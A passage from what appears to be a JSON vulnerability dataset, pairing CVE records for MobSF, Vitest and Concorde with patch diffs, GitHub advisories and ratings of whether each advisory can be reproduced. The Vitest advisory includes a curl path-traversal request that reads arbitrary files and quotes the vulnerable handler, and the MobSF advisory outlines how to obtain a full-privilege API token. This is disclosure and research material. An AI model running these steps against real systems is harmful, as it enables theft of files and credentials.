\"sha256:9dc05717c8079cad31268a9714cc6966931e7400487cfa0c19e6c077dea129ac\"},\n+    {file = \"frida-16.6.6-cp37-abi3-manylinux1_x86_64.whl\", hash = \"sha256:288d99fb774bd04b229977bf112878674e851dbb6e14b528aeb04ec085b10a4f\"},\n+    {file = \"frida-16.6.6-cp37-abi3-manylinux2014_aarch64.whl\", hash = \"sha256:d74bd8de1aebd0acae49c89fad6ace2dddf5852df236b805dc83d5c524745e59\"},\n+    {file = \"frida-16.6.6-cp37-abi3-manylinux2014_armv7l.whl\", hash = \"sha256:853e1e786b24b726ea0e91e6855ca879271bf3dd4265085c019c19d716f489fd\"},\n+    {file = \"frida-16.6.6-cp37-abi3-manylinux_2_17_aarch64.whl\", hash = \"sha256:ab9ca0e41e89cc881dbaa33c724066c9839c1b92a06b9f92fa9ab00dc31d62e0\"},\n+    {file = \"frida-16.6.6-cp37-abi3-manylinux_2_17_armv7l.whl\", hash = \"sha256:47aaacb1246a0f8587a1f4083761189aea39c51ce545cf998076814172d31770\"},\n+    {file = \"frida-16.6.6-cp37-abi3-manylinux_2_5_i686.whl\", hash = \"sha256:9ba5c342fc7a46599a4835e2fb3693342ec732963a0518b2d884d951bb5ea5f4\"},\n+    {file = \"frida-16.6.6-cp37-abi3-manylinux_2_5_x86_64.whl\", hash = \"sha256:f27b230dd243ab3708f4051bcd9567cfe02893a706c5c3fe1573ccc2ef5a2969\"},\n+    {file = \"frida-16.6.6-cp37-abi3-win32.whl\", hash = \"sha256:44b4044625afa60f0799fedecfe0a25dab610556a469151dc02569555d0436a9\"},\n+    {file = \"frida-16.6.6-cp37-abi3-win_amd64.whl\", hash = \"sha256:12d0117ea035bfcb5e4d685e88af02ce815169945702192ea9c21c0ebba42706\"},\n+    {file = \"frida-16.6.6.tar.gz\", hash = \"sha256:384572cd21185e6b152628216e83fcddbb869572ad55609582580494ce8b6c2a\"},\n ]\n \n [package.dependencies]\n\n@@ -1452,13 +1495,13 @@\nfiles = [\n \n [[package]]\n name = \"paramiko\"\n-version = \"3.5.0\"\n+version = \"3.5.1\"\n description = \"SSH2 protocol library\"\n optional = false\n python-versions = \">=3.6\"\n files = [\n-    {file = \"paramiko-3.5.0-py3-none-any.whl\", hash = \"sha256:1fedf06b085359051cd7d0d270cebe19e755a8a921cc2ddbfa647fb0cd7d68f9\"},\n-    {file = \"paramiko-3.5.0.tar.gz\", hash = \"sha256:ad11e540da4f55cedda52931f1a3f812a8238a7af7f62a60de538cd80bb28124\"},\n+    {file = \"paramiko-3.5.1-py3-none-any.whl\", hash = \"sha256:43b9a0501fc2b5e70680388d9346cf252cfb7d00b0667c39e80eb43a408b8f61\"},\n+    {file = \"paramiko-3.5.1.tar.gz\", hash = \"sha256:b2c665bc45b2b215bd7d7f039901b14b067da00f3a11e6640995fd58f2664822\"},\n ]\n \n [package.dependencies]\n\n@@ -1691,29 +1734,19 @@\ntest = [\"codecov (>=2.0.5)\", \"hypothesis (>=3.5.3)\", \"mock (>=1.0.1)\", \"pytest (\n \n [[package]]\n name = \"pylsqpack\"\n-version = \"0.3.18\"\n+version = \"0.3.19\"\n description = \"Python wrapper for the ls-qpack QPACK library\"\n optional = false\n-python-versions = \">=3.8\"\n+python-versions = \">=3.9\"\n files = [\n-    {file = \"pylsqpack-0.3.18-cp38-abi3-macosx_10_9_x86_64.whl\", hash = \"sha256:1f415d2e03c779261ac7ed421a009a4c752eef6f1ef7b5a34c4a463a5e17fbad\"},\n-    {file = \"pylsqpack-0.3.18-cp38-abi3-macosx_11_0_arm64.whl\", hash = \"sha256:c84e6d4dcb708d766a50bfd16579d8a0bff4eb4e5f5dff9f3df4018454d4013b\"},\n-    {file = \"pylsqpack-0.3.18-cp38-abi3-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\", hash = \"sha256:bac5f2dc255ae70e5a14033e769769b38bd4c980b365dacd88665610f245e36f\"},\n-    {file = \"pylsqpack-0.3.18-cp38-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\", hash = \"sha256:75042b442a0a7a283b5adc21045e6583f3c817d40ccec769837bf2f90b79c494\"},\n-    {file = \"pylsqpack-0.3.18-cp38-abi3-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl\", hash = \"sha256:8b5fd04bb27180286811f8e1659974e6e5e854a882de3f2aba8caefc1bb9ab81\"},\n-    {file = \"pylsqpack-0.3.18-cp38-abi3-win32.whl\", hash = \"sha256:a2798e1c08bd36875f77a1ebec0f130fdf9e27eebdb0499a764201d55ef78770\"},\n-    {file = \"pylsqpack-0.3.18-cp38-abi3-win_amd64.whl\", hash = \"sha256:40465d025b946bca195bdaed74b3b79fe3f7f419ab1d4bc4109dca34ba9881d7\"},\n-    {file = \"pylsqpack-0.3.18-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\", hash = \"sha256:ae628cd359ecb466dd85f151ea1ad53de3114e5a9ae0f0ac1408fb43a4318032\"},\n-    {file = \"pylsqpack-0.3.18-pp38-pypy38_pp73-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\", hash = \"sha256:4a248be29d9ca1fa2ebd7ef4b8ac166d17df0d8d4631b4499c8c566e221d4e5b\"},\n-    {file = \"pylsqpack-0.3.18-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\", hash = \"sha256:005ddce84bdcbf5c3cf99f764504208e1aa0a91a8331bf47108f2708f2a315e6\"},\n-    {file = \"pylsqpack-0.3.18-pp38-pypy38_pp73-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl\", hash = \"sha256:3dd664354422d4cd51c189febb5f5d22bf3d8c453cc25517c04ce01a57478060\"},\n-    {file = \"pylsqpack-0.3.18-pp38-pypy38_pp73-win_amd64.whl\", hash = \"sha256:c003eb882f41e4dbd093243c67b97c8634209b4d5ba7edd16163b1ff37306254\"},\n-    {file = \"pylsqpack-0.3.18-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\", hash = \"sha256:8ea75152e8cb8b8c7cfef11c3aa5ebe5b226bd850889f56ff70a688e9680acbf\"},\n-    {file = \"pylsqpack-0.3.18-pp39-pypy39_pp73-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\", hash = \"sha256:3c4cccfd91afd589994f844fd1dbae0acdb58a8ab929d8edeadb25339deb6590\"},\n-    {file = \"pylsqpack-0.3.18-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\", hash = \"sha256:06e1bbe47514b83cd03158e5558ef8cc44f578169c1820098be9f3cc4137f16a\"},\n-    {file = \"pylsqpack-0.3.18-pp39-pypy39_pp73-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl\", hash = \"sha256:e1054b0b44f6141a99e84a9aa6a27c9df028e9223747b893e8e37cdc95b602f1\"},\n-    {file = \"pylsqpack-0.3.18-pp39-pypy39_pp73-win_amd64.whl\", hash = \"sha256:711f3aa645f72a928e22606c1f026cde905de23efc07028fe1bc7429f73ec8ee\"},\n-    {file = \"pylsqpack-0.3.18.tar.gz\", hash = \"sha256:45ae55e721877505f4d5ccd49591d69353f2a548a8673dfafb251d385b3c097f\"},\n+    {file = \"pylsqpack-0.3.19-cp39-abi3-macosx_10_9_x86_64.whl\", hash = \"sha256:2a7be40115f2131ed41720b435e717a2999e79b8ebff0f7b8c14a4956e008883\"},\n+    {file = \"pylsqpack-0.3.19-cp39-abi3-macosx_11_0_arm64.whl\", hash = \"sha256:b37b30e18aeea80aea26106c37d527f64325cbc7a53db73865604adcf9ae8777\"},\n+    {file = \"pylsqpack-0.3.19-cp39-abi3-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\", hash = \"sha256:501ed816267b7a0cdb17ab9fd7d305ae928ef34cb5a9db5f4ba1e9f1eab37118\"},\n+    {file = \"pylsqpack-0.3.19-cp39-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\", hash = \"sha256:2eaaa61ab88deeecbd9dc2c3141883c806b7b294969e96fe38672cd42421d82f\"},\n+    {file = \"pylsqpack-0.3.19-cp39-abi3-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl\", hash = \"sha256:ad34cb004085f089893c7f349bdc8dd46b8e60b1f2a7cd4921f09fe056f562f4\"},\n+    {file = \"pylsqpack-0.3.19-cp39-abi3-win32.whl\", hash = \"sha256:877f19365ddd1d9dde9cfb421729100f9e733e17664b5222bb8bf7ab6a5b03b6\"},\n+    {file = \"pylsqpack-0.3.19-cp39-abi3-win_amd64.whl\", hash = \"sha256:ed578b37a78a4d8a458f82d48caa374b188a862badf531e342bc331737727921\"},\n+    {file = \"pylsqpack-0.3.19.tar.gz\", hash = \"sha256:529fa3e3d6f1b0eec92b434503c0ec551cb714023cc1710911f665fab6a86ebd\"},\n ]\n \n [[package]]\n```\n\nFilename: pyproject.toml:\n```\n@@ -1,6 +1,6 @@\n[tool.poetry]\n name = \"mobsf\"\n-version = \"4.3.0\"\n+version = \"4.3.1\"\n description = \"Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis.\"\n keywords = [\"mobsf\", \"mobile security framework\", \"mobile security\", \"security tool\", \"static analysis\", \"dynamic analysis\", \"malware analysis\"]\n authors = [\"Ajin Abraham <ajin@opensecurity.in>\"]\n```",
                "url": "https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/05206e72cae35b311615a70e51e1a946955c5e83"
            }
        ],
        "published_date": "2025-02-05T18:41:02.991Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nMobSF\n/\nMobile-Security-Framework-MobSF\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 3.4k\nStar 18.6k\nCode\nIssues\n12\nPull requests\n4\nActions\nSecurity\n12\nInsights\nAdditional navigation options\nLocal Privilege escalation due to leaked REST API key in web UI\nHigh ajinabraham published GHSA-79f6-p65j-3m2m on Feb 4Feb 5, 2025\nPackage\npip mobsf\n(\npip\n)\nAffected versions\n4.3.0\nPatched versions\n4.3.1\nDescription\nProduct: Mobile Security Framework (MobSF)\nVersion: 4.3.0\nCWE-ID: CWE-269: Improper Privilege Management\nCVSS vector v.4.0: 7.1 (AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:L/SI:N/SA:N)\nCVSS vector v.3.1: 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)\nDescription: MobSF has a functionality of dividing users by roles. This functionality is not efficient, because any registered user can get API Token with all privileges.\nImpact: Information Disclosure\nVulnerable component: Code output component (/source_code)\nExploitation conditions: authorized user\nMitigation: Remove token output in the returned js-script\nResearcher: Egor Filatov (Positive Technologies)\nResearch\nResearcher discovered zero-day vulnerability \u00abLocal Privilege Escalation\u00bb in Mobile Security Framework (MobSF).\nTo reproduce the vulnerability follow the steps below.\n\u2022 A user with minimal privileges is required, so the administrator must create a user account\nFigure 1. Registration\n\u2022 Go to static analysis of any application\nFigure 2. Static analysis\n\u2022 Go to the code review of the selected application and get a token with all privileges in the response\nFigure 3. Token receiving\n\u2022 This token can be used to retrieve dynamic analysis information that has not been accessed before.\nFigure 4. No access demonstration\nFigure 5. Token usage\nAs a result, the user is able to escalate the privileges.\nPlease, assign all credits to: Egor Filatov (Positive Technologies)\nSeverity\nHigh\n8.5\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nLow\nAttack Requirements\nNone\nPrivileges Required\nLow\nUser interaction\nPassive\nVulnerable System Impact Metrics\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nSubsequent System Impact Metrics\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nNone\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N\nCVE ID\nCVE-2025-24805\nWeaknesses\nCWE-269\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory provides a step-by-step procedure along with descriptive figures to demonstrate how to exploit the vulnerability.",
                "url": "https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-79f6-p65j-3m2m"
            }
        ],
        "sw_version": "v4.3.0",
        "sw_version_wget": "https://github.com/MobSF/Mobile-Security-Framework-MobSF/archive/refs/tags/v4.3.0.zip"
    },
    "CVE-2025-24963": {
        "cwe": [
            {
                "id": "CWE-22",
                "value": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
            }
        ],
        "description": "Vitest is a testing framework powered by Vite. The `__screenshot-error` handler on the browser mode HTTP server that responds any file on the file system. Especially if the server is exposed on the network by `browser.api.host: true`, an attacker can send a request to that handler from remote to get the content of arbitrary files.This `__screenshot-error` handler on the browser mode HTTP server responds any file on the file system. This code was added by commit `2d62051`. Users explicitly exposing the browser mode server to the network by `browser.api.host: true` may get any files exposed. This issue has been addressed in versions 2.1.9 and 3.0.4. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
        "languages": [
            "TypeScript"
        ],
        "patch_commits": [
            {
                "content": "feat(browser): allow preview and open in the editor screenshot error from ui (#6113)\n\nFilename: packages/browser/src/node/plugin.ts:\n```\n@@ -1,7 +1,8 @@\nimport { fileURLToPath } from 'node:url'\n import { createRequire } from 'node:module'\n-import { readFileSync } from 'node:fs'\n-import { basename, resolve } from 'pathe'\n+import { lstatSync, readFileSync } from 'node:fs'\n+import type { Stats } from 'node:fs'\n+import { basename, extname, resolve } from 'pathe'\n import sirv from 'sirv'\n import type { WorkspaceProject } from 'vitest/node'\n import { getFilePoolName, resolveApiServerConfig, resolveFsAllow, distDir as vitestDist } from 'vitest/node'\n\n@@ -100,6 +101,52 @@\nexport default (browserServer: BrowserServer, base = '/'): Plugin[] => {\n             },\n           }),\n         )\n+\n+        const screenshotFailures = project.config.browser.ui && project.config.browser.screenshotFailures\n+\n+        // eslint-disable-next-line prefer-arrow-callback\n+        screenshotFailures && server.middlewares.use(`${base}__screenshot-error`, function vitestBrowserScreenshotError(req, res) {\n+          if (!req.url || !browserServer.provider) {\n+            res.statusCode = 404\n+            res.end()\n+            return\n+          }\n+\n+          const url = new URL(req.url, 'http://localhost')\n+          const file = url.searchParams.get('file')\n+          if (!file) {\n+            res.statusCode = 404\n+            res.end()\n+            return\n+          }\n+\n+          let stat: Stats | undefined\n+          try {\n+            stat = lstatSync(file)\n+          }\n+          catch (_) {\n+          }\n+\n+          if (!stat?.isFile()) {\n+            res.statusCode = 404\n+            res.end()\n+            return\n+          }\n+\n+          const ext = extname(file)\n+          const buffer = readFileSync(file)\n+          res.setHeader(\n+            'Cache-Control',\n+            'public,max-age=0,must-revalidate',\n+          )\n+          res.setHeader('Content-Length', buffer.length)\n+          res.setHeader('Content-Type', ext === 'jpeg' || ext === 'jpg'\n+            ? 'image/jpeg'\n+            : ext === 'webp'\n+              ? 'image/webp'\n+              : 'image/png')\n+          res.end(buffer)\n+        })\n       },\n     },\n     {\n```\n\nFilename: packages/ui/client/components.d.ts:\n```\n@@ -27,6 +27,7 @@\ndeclare module 'vue' {\n     ProgressBar: typeof import('./components/ProgressBar.vue')['default']\n     RouterLink: typeof import('vue-router')['RouterLink']\n     RouterView: typeof import('vue-router')['RouterView']\n+    ScreenshotError: typeof import('./components/views/ScreenshotError.vue')['default']\n     StatusIcon: typeof import('./components/StatusIcon.vue')['default']\n     TestFilesEntry: typeof import('./components/dashboard/TestFilesEntry.vue')['default']\n     TestsEntry: typeof import('./components/dashboard/TestsEntry.vue')['default']\n```\n\nFilename: packages/ui/client/components/views/ScreenshotError.vue:\n```\n@@ -0,0 +1,53 @@\n+<script setup lang=\"ts\">\n+defineProps<{\n+  file: string\n+  name: string\n+  url?: string\n+}>()\n+const emit = defineEmits<{ (e: 'close'): void }>()\n+\n+onKeyStroke('Escape', () => {\n+  emit('close')\n+})\n+</script>\n+\n+<template>\n+  <div w-350 max-w-screen h-full flex flex-col>\n+    <div p-4 relative border=\"base b\">\n+      <p>Screenshot error</p>\n+      <p op50 font-mono text-sm>\n+        {{ file }}\n+      </p>\n+      <p op50 font-mono text-sm>\n+        {{ name }}\n+      </p>\n+      <IconButton\n+        icon=\"i-carbon:close\"\n+        title=\"Close\"\n+        absolute\n+        top-5px\n+        right-5px\n+        text-2xl\n+        @click=\"emit('close')\"\n+      />\n+    </div>\n+\n+    <div class=\"scrolls\" grid=\"~ cols-1 rows-[min-content]\" p-4>\n+      <img\n+        v-if=\"url\"\n+        :src=\"url\"\n+        :alt=\"`Screenshot error for '${name}' test in file '${file}'`\"\n+        border=\"base t r b l dotted red-500\"\n+      >\n+      <div v-else>\n+        Something was wrong, the image cannot be resolved.\n+      </div>\n+    </div>\n+  </div>\n+</template>\n+\n+<style scoped>\n+.scrolls {\n+  place-items: center;\n+}\n+</style>\n```\n\nFilename: packages/ui/client/components/views/ViewReport.vue:\n```\n@@ -3,7 +3,7 @@\nimport type { ErrorWithDiff, File, Suite, Task } from 'vitest'\n import type Convert from 'ansi-to-html'\n import { isDark } from '~/composables/dark'\n import { createAnsiToHtmlFilter } from '~/composables/error'\n-import { config } from '~/composables/client'\n+import { browserState, config } from '~/composables/client'\n import { escapeHtml } from '~/utils/escape'\n \n const props = defineProps<{\n\n@@ -103,6 +103,30 @@\nconst failed = computed(() => {\n     ? mapLeveledTaskStacks(isDark.value, failedFlatMap)\n     : failedFlatMap\n })\n+\n+function open(task: Task) {\n+  const filePath = task.meta?.failScreenshotPath\n+  if (filePath) {\n+    fetch(`/__open-in-editor?file=${encodeURIComponent(filePath)}`)\n+  }\n+}\n+\n+const showScreenshot = ref(false)\n+const timestamp = ref(Date.now())\n+const currentTask = ref<Task | undefined>()\n+const currentScreenshotUrl = computed(() => {\n+  const file = currentTask.value?.meta.failScreenshotPath\n+  // force refresh\n+  const t = timestamp.value\n+  // browser plugin using /, change this if base can be modified\n+  return file ? `/__screenshot-error?file=${encodeURIComponent(file)}&t=${t}` : undefined\n+})\n+\n+function showScreenshotModal(task: Task) {\n+  currentTask.value = task\n+  timestamp.value = Date.now()\n+  showScreenshot.value = true\n+}\n </script>\n \n <template>\n\n@@ -121,7 +145,25 @@\nconst failed = computed(() => {\n             }rem`,\n           }\"\n         >\n-          {{ task.name }}\n+          <div flex=\"~ gap-2 items-center\">\n+            <span>{{ task.name }}</span>\n+            <template v-if=\"browserState && task.meta?.failScreenshotPath\">\n+              <IconButton\n+                v-tooltip.bottom=\"'View screenshot error'\"\n+                class=\"!op-100\"\n+                icon=\"i-carbon:image\"\n+                title=\"View screenshot error\"\n+                @click=\"showScreenshotModal(task)\"\n+              />\n+              <IconButton\n+                v-tooltip.bottom=\"'Open screenshot error in editor'\"\n+                class=\"!op-100\"\n+                icon=\"i-carbon:image-reference\"\n+                title=\"Open screenshot error in editor\"\n+                @click=\"open(task)\"\n+              />\n+            </template>\n+          </div>\n           <div\n             v-if=\"task.result?.htmlError\"\n             class=\"scrolls scrolls-rounded task-error\"\n\n@@ -146,6 +188,20 @@\nconst failed = computed(() => {\n         All tests passed in this file\n       </div>\n     </template>\n+    <template v-if=\"browserState\">\n+      <Modal v-model=\"showScreenshot\" direction=\"right\">\n+        <template v-if=\"currentTask\">\n+          <Suspense>\n+            <ScreenshotError\n+              :file=\"currentTask.file.filepath\"\n+              :name=\"currentTask.name\"\n+              :url=\"currentScreenshotUrl\"\n+              @close=\"showScreenshot = false\"\n+            />\n+          </Suspense>\n+        </template>\n+      </Modal>\n+    </template>\n   </div>\n </template>\n```",
                "url": "https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f"
            }
        ],
        "published_date": "2025-02-04T19:36:52.385Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nvitest-dev\n/\nvitest\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 1.3k\nStar 14.3k\nCode\nIssues\n278\nPull requests\n83\nDiscussions\nActions\nProjects\n1\nSecurity\n2\nInsights\nAdditional navigation options\nBrowser mode serves arbitrary files\nModerate sheremet-va published GHSA-8gvc-j273-4wm5 on Feb 3Feb 4, 2025\nPackage\nnpm vitest\n(\nnpm\n)\nAffected versions\n>=2.0.4, <=2.1.8\n>=3.0.0, <= 3.0.3\nPatched versions\n>=2.1.9, <3.0.0\n>=3.0.4\nDescription\nSummary\n__screenshot-error handler on the browser mode HTTP server that responds any file on the file system. Especially if the server is exposed on the network by browser.api.host: true, an attacker can send a request to that handler from remote to get the content of arbitrary files.\nDetails\nThis __screenshot-error handler on the browser mode HTTP server responds any file on the file system.\nvitest/packages/browser/src/node/plugin.ts\nLines 88 to 130 in f17918a\n   server.middlewares.use(`${base}__screenshot-error`, function vitestBrowserScreenshotError(req, res) { \n     if (!req.url) { \n       res.statusCode = 404 \n       res.end() \n       return \n     } \n        const url = new URL(req.url, 'http://localhost') \n     const file = url.searchParams.get('file') \n     if (!file) { \n       res.statusCode = 404 \n       res.end() \n       return \n     } \n        let stat: Stats | undefined \n     try { \n       stat = lstatSync(file) \n     } \n     catch { \n     } \n        if (!stat?.isFile()) { \n       res.statusCode = 404 \n       res.end() \n       return \n     } \n        const ext = extname(file) \n     const buffer = readFileSync(file) \n     res.setHeader( \n       'Cache-Control', \n       'public,max-age=0,must-revalidate', \n     ) \n     res.setHeader('Content-Length', buffer.length) \n     res.setHeader('Content-Type', ext === 'jpeg' || ext === 'jpg' \n       ? 'image/jpeg' \n       : ext === 'webp' \n         ? 'image/webp' \n         : 'image/png') \n     res.end(buffer) \n   }) \n } \nThis code was added by 2d62051.\nPoC\nCreate a directory and change the current directory to that directory\nRun npx vitest init browser\nRun npm run test:browser\nRun curl http://localhost:63315/__screenshot-error?file=/path/to/any/file\nImpact\nUsers explicitly exposing the browser mode server to the network by browser.api.host: true may get any files exposed.\nSeverity\nModerate\n5.9\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N\nCVE ID\nCVE-2025-24963\nWeaknesses\nCWE-22\nCredits\nsapphi-red\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory contains a section labeled 'PoC' which includes steps to recreate the vulnerability.",
                "url": "https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5"
            }
        ],
        "sw_version": "v2.0.4",
        "sw_version_wget": "https://github.com/vitest-dev/vitest/archive/refs/tags/v2.0.4.zip"
    },
    "CVE-2025-24973": {
        "cwe": [
            {
                "id": "CWE-613",
                "value": "CWE-613: Insufficient Session Expiration"
            }
        ],
        "description": "Concorde, formerly know as Nexkey, is a fork of the federated microblogging platform Misskey. Prior to version 12.25Q1.1, due to an improper implementation of the logout process, authentication credentials remain in cookies even after a user has explicitly logged out, which may allow an attacker to steal authentication tokens. This could have devastating consequences if a user with admin privileges is (or was) using a shared device. Users who have logged in on a shared device should go to Settings > Security and regenerate their login tokens. Version 12.25Q1.1 fixes the issue. As a workaround, clear cookies and site data in the browser after logging out.",
        "languages": [
            "TypeScript",
            "Vue"
        ],
        "patch_commits": [
            {
                "content": "fix: clear cookie when signout called\n\nFilename: packages/client/src/account.ts:\n```\n@@ -21,6 +21,12 @@\nexport const iAmAdmin = $i != null && $i.isAdmin;\n \n export async function signout() {\n     waiting();\n+    document.cookie.split(\";\").forEach((cookie) => {\n+        const cookieName = cookie.split(\"=\")[0].trim();\n+        if (cookieName === \"token\") {\n+            document.cookie = `${cookieName}=; max-age=0; path=/`;\n+        }\n+    });\n     localStorage.removeItem(\"account\");\n \n     await removeAccount($i.id);\n```",
                "url": "https://github.com/nexryai/concorde/commit/1f6ac9b289906083b132e4f9667a31a60ef83e4e"
            }
        ],
        "published_date": "2025-02-11T15:41:41.811Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nnexryai\n/\nconcorde\nPublic\nNotifications You must be signed in to change notification settings\nFork 1\nStar 23\nCode\nIssues\n10\nPull requests\n8\nActions\nSecurity\n6\nInsights\nAdditional navigation options\nAuthentication tokens not being removed after logging out\nCritical nexryai published GHSA-2369-p2wh-7cc2 on Feb 10Feb 11, 2025\nPackage\ndocker nexryai/nexkey\n(\nDocker\n)\nAffected versions\n< 12.24Q4.2\nPatched versions\n12.25Q1.1\nDescription\nImpact\nDue to an improper implementation of the logout process, authentication credentials remain in cookies even after a user has explicitly logged out, which may allow an attacker to steal authentication tokens.\n\u4e0d\u9069\u5207\u306a\u30ed\u30b0\u30a2\u30a6\u30c8\u51e6\u7406\u306e\u5b9f\u88c5\u306b\u3088\u308a\u3001\u30e6\u30fc\u30b6\u30fc\u304c\u660e\u793a\u7684\u306b\u30ed\u30b0\u30a2\u30a6\u30c8\u3092\u884c\u3063\u305f\u5f8c\u3082Cookie\u306b\u8a8d\u8a3c\u30af\u30ec\u30c7\u30f3\u30b7\u30e3\u30eb\u304c\u6b8b\u308a\u7d9a\u3051\u307e\u3059\u3002\u3053\u308c\u306b\u3088\u308a\u653b\u6483\u8005\u306b\u8a8d\u8a3c\u30c8\u30fc\u30af\u30f3\u3092\u7a83\u76d7\u3055\u308c\u308b\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002\n\nThis could have devastating consequences if a user with admin privileges is (or was) using a shared device.\nIf you have previously logged in on a public device, we strongly recommend that you immediately go to Settings > Security and regenerate your login token.\n\u3053\u308c\u306fadmin\u6a29\u9650\u3092\u6301\u3064\u30e6\u30fc\u30b6\u30fc\u304c\u5171\u6709\u7aef\u672b\u3092\u4f7f\u7528\u3057\u3066\u3044\u308b\uff08\u3057\u3066\u3044\u305f\uff09\u5834\u5408\u306b\u58ca\u6ec5\u7684\u306a\u7d50\u679c\u3092\u3082\u305f\u3089\u3059\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002\n\u904e\u53bb\u306b\u516c\u5171\u306e\u7aef\u672b\u306a\u3069\u3067\u30ed\u30b0\u30a4\u30f3\u3057\u305f\u3053\u3068\u304c\u3042\u308b\u5834\u5408\u3001\u901f\u3084\u304b\u306b\u8a2d\u5b9a\u2192\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u304b\u3089\u30ed\u30b0\u30a4\u30f3\u30c8\u30fc\u30af\u30f3\u306e\u518d\u751f\u6210\u3092\u884c\u3046\u3053\u3068\u3092\u5f37\u304f\u63a8\u5968\u3057\u307e\u3059\u3002\nPatches\nFixed on this commit\nWorkarounds\nClear cookies and site data in your browser after logging out\nSeverity\nCritical\n9.4\n/ 10\nCVSS v3 base metrics\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\nCVE ID\nCVE-2025-24973\nWeaknesses\nNo CWEs\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory does not include specific proof-of-concept code or explicit steps to reproduce the issue.",
                "url": "https://github.com/nexryai/concorde/security/advisories/GHSA-2369-p2wh-7cc2"
            }
        ],
        "sw_version": "v12.24Q4.2",
        "sw_version_wget": "https://github.com/nexryai/concorde/archive/refs/tags/v12.24Q4.2.zip"
    },
    "CVE-2025-25202": {
        "cwe": [
            {
                "id": "CWE-269",
                "value": "CWE-269: Improper Privilege Management"
            }
        ],
        "description": "Ash Authentication is an authentication framework for Elixir applications. Applications which have been bootstrapped by the igniter installer present since AshAuthentication v4.1.0 and who have used the magic link strategy _or_ are manually revoking tokens are affected by revoked tokens being allowed to verify as valid. Unless one hase implemented any kind of custom token revocation feature in your application, then one will not be affected. The impact here for users using builtin functionality is that magic link tokens are reusable until they expire. With that said, magic link tokens are only valid for 10 minutes, so the surface area for abuse is extremely low here. The flaw is patched in version 4.4.9. Additionally a compile time warning is shown to users with remediation instructions if they upgrade. 4.4.9 ships with an upgrader, so those who use `mix igniter.upgrade ash_authentication` will have the necessary patch applied. Otherwise, one may run the upgrader manually as described in the error message. As a workaround, delete the generated `:revoked?` generic action in the token resource. This will cause it to use the one internal to Ash Authentication which has always been correct. Alternatively, manually make the changes that are included in the patch.",
        "languages": [
            "Elixir"
        ],
        "patch_commits": [
            {
